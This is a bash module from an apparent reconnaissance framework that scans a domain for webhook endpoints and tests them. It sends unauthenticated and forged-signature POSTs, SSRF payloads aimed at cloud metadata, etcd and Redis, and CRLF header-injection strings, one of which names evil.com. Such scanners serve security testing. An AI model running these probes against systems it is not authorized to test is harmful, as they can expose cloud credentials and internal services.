#!/usr/bin/env bash
# webhook_discovery_phase.sh - Webhook endpoint discovery, webhook authentication
# testing, payload validation.

webhook_discovery_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "webhook_discovery_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/webhook_discovery"

    local results=0
    local endpoints_file="$output_dir/webhook_discovery/webhook_endpoints.txt"
    local vulns_file="$output_dir/webhook_discovery/webhook_vulns.txt"
    local findings_file="$output_dir/webhook_discovery/findings.json"

    log "INFO" "Starting webhook discovery phase for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    # --- Discover webhook endpoints ---
    local webhook_paths=(
        "/webhook"
        "/webhooks"
        "/api/webhook"
        "/api/webhooks"
        "/api/v1/webhook"
        "/api/v1/webhooks"
        "/hook"
        "/hooks"
        "/api/hook"
        "/api/hooks"
        "/callback"
        "/callbacks"
        "/api/callback"
        "/api/callbacks"
        "/notify"
        "/api/notify"
        "/api/v1/notify"
        "/events"
        "/api/events"
        "/api/v1/events"
        "/ingest"
        "/api/ingest"
        "/api/v1/ingest"
        "/receive"
        "/api/receive"
        "/push"
        "/api/push"
        "/trigger"
        "/api/trigger"
        "/github"
        "/github/webhook"
        "/github/events"
        "/stripe"
        "/stripe/webhook"
        "/twilio"
        "/twilio/webhook"
        "/slack"
        "/slack/events"
        "/discord"
        "/discord/webhook"
    )

    for whpath in "${webhook_paths[@]}"; do
        local wh_url="https://${domain}${whpath}"
        local wh_status wh_body
        wh_body=$(curl -s -m 10 -w "\n%{http_code}" "$wh_url" 2>/dev/null || true)
        wh_status=$(echo "$wh_body" | tail -1)

        if [[ "$wh_status" != "000" && "$wh_status" != "404" ]]; then
            log "INFO" "Webhook endpoint found: $wh_url (HTTP $wh_status)"

            echo "[WEBHOOK-ENDPOINT] $wh_url - HTTP $wh_status" >> "$endpoints_file"
            ((results++)) || true

            write_endpoint "{\"url\":\"$wh_url\",\"method\":\"GET\",\"status\":$wh_status,\"phase\":\"webhook_discovery\"}" \
                "$findings_file" 2>/dev/null || true
        fi
    done

    # --- Test webhook authentication bypass ---
    local test_payloads=(
        '{"event":"test","data":{"message":"ping"}}'
        '{"type":"webhook","action":"test"}'
        '{"hook_id":"test","payload":{"test":true}}'
        '{"event_type":"test.ping","timestamp":"2024-01-01T00:00:00Z"}'
    )

    local auth_headers=(
        ""
        "Authorization: Bearer test"
        "X-Webhook-Secret: test"
        "X-Hub-Signature-256: sha256=test"
        "X-Hub-Signature: sha1=test"
        "X-GitHub-Event: push"
        "X-GitHub-Delivery: test"
        "X-Stripe-Signature: test"
        "X-Twilio-Signature: test"
        "X-Slack-Signature: v0=test"
    )

    for whpath in "${webhook_paths[@]:0:15}"; do
        local wh_url="https://${domain}${whpath}"

        for payload in "${test_payloads[@]}"; do
            for header in "${auth_headers[@]}"; do
                local header_args=""
                if [[ -n "$header" ]]; then
                    header_args="-H \"$header\""
                fi

                local post_resp post_status
                post_resp=$(curl -s -m 10 -w "\n%{http_code}" -X POST \
                    -H "Content-Type: application/json" \
                    ${header_args:+"-H" "$header"} \
                    -d "$payload" \
                    "$wh_url" 2>/dev/null || true)
                post_status=$(echo "$post_resp" | tail -1)

                if [[ "$post_status" == "200" || "$post_status" == "201" || "$post_status" == "202" ]]; then
                    # If no auth header was used, this is a vulnerability
                    if [[ -z "$header" ]]; then
                        echo "[WH-NO-AUTH] $wh_url - Webhook accepts POST without authentication" >> "$vulns_file"
                        ((results++)) || true

                        write_finding "{\"type\":\"webhook_no_auth\",\"url\":\"$wh_url\",\"severity\":\"HIGH\",\"evidence\":\"Webhook endpoint accepts requests without authentication\"}" \
                            "$findings_file" 2>/dev/null || true
                    fi
                elif [[ "$post_status" == "401" || "$post_status" == "403" ]]; then
                    # Auth required - good
                    break
                fi
            done
        done
    done

    # --- Test for webhook SSRF ---
    local ssrf_payloads=(
        '{"url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://169.254.169.254/latest/meta-data/"}'
        '{"webhook_url":"http://127.0.0.1:2379/v2/keys/","target":"http://127.0.0.1:2379/"}'
        '{"redirect_url":"http://[::1]/","endpoint":"http://0.0.0.0/"}'
        '{"notify_url":"http://localhost:6379/","ping":"http://internal-service:8080/"}'
    )

    for whpath in "${webhook_paths[@]:0:10}"; do
        local wh_url="https://${domain}${whpath}"

        for payload in "${ssrf_payloads[@]}"; do
            local ssrf_resp ssrf_status
            ssrf_resp=$(curl -s -m 15 -w "\n%{http_code}" -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$wh_url" 2>/dev/null || true)
            ssrf_status=$(echo "$ssrf_resp" | tail -1)

            if [[ "$ssrf_status" == "200" ]]; then
                local ssrf_body
                ssrf_body=$(echo "$ssrf_resp" | head -n -1)

                # Check if metadata or internal data is leaked
                echo "$ssrf_body" | grep -qiE '(ami-id|instance-id|iam|local-ipv4|security-groups|hostname)' 2>/dev/null && {
                    echo "[WH-SSRF] $wh_url - Webhook SSRF: metadata leaked via callback" >> "$vulns_file"
                    ((results++)) || true

                    write_finding "{\"type\":\"webhook_ssrf\",\"url\":\"$wh_url\",\"severity\":\"CRITICAL\",\"evidence\":\"Webhook SSRF allows reading cloud metadata\"}" \
                        "$findings_file" 2>/dev/null || true
                } || true

                echo "$ssrf_body" | grep -qiE '(root:|ETCD|apiVersion|kind:)' 2>/dev/null && {
                    echo "[WH-SSRF-INTERNAL] $wh_url - Webhook SSRF: internal data leaked" >> "$vulns_file"
                    ((results++)) || true

                    write_finding "{\"type\":\"webhook_ssrf_internal\",\"url\":\"$wh_url\",\"severity\":\"CRITICAL\",\"evidence\":\"Webhook SSRF leaks internal system data\"}" \
                        "$findings_file" 2>/dev/null || true
                } || true
            fi
        done
    done

    # --- Test webhook payload injection ---
    local inject_payloads=(
        '{"event":"test\nX-Injected: true"}'
        '{"data":"test\r\nX-Injected: true"}'
        '{"event":"test\n\nGET /admin HTTP/1.1"}'
        '{"url":"http://evil.com","event":"test"; "url":"http://internal"}'
    )

    for whpath in "${webhook_paths[@]:0:10}"; do
        local wh_url="https://${domain}${whpath}"

        for payload in "${inject_payloads[@]}"; do
            local inj_resp inj_status
            inj_resp=$(curl -s -m 10 -w "\n%{http_code}" -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$wh_url" 2>/dev/null || true)
            inj_status=$(echo "$inj_resp" | tail -1)

            if [[ "$inj_status" == "200" ]]; then
                echo "[WH-HEADER-INJECT] $wh_url - Webhook accepts injected headers" >> "$vulns_file"
                ((results++)) || true

                write_finding "{\"type\":\"webhook_header_injection\",\"url\":\"$wh_url\",\"severity\":\"MEDIUM\",\"evidence\":\"Webhook accepts newline-injected headers in payload\"}" \
                    "$findings_file" 2>/dev/null || true
                break
            fi
        done
    done

    # Write count
    echo "$results" > "$output_dir/webhook_discovery/count.txt"

    py_log "INFO" "webhook_discovery_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "Webhook discovery phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    webhook_discovery_phase "$@"
fi
